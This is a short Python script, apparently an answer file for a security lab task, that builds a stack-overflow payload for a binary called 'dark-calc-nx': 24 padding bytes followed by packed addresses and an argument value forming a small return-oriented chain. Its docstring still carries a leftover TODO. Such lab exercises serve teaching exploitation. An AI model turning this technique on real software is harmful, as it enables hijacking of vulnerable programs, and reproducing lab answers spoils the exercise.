#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
import struct
def p64(x):
    return struct.pack('<Q', x)
payload = b'A' * 24
payload += p64(0x401a7a)  
payload += p64(0x401a79)  
payload += p64(4)         
payload += p64(0x401978)  
sys.stdout.buffer.write(payload)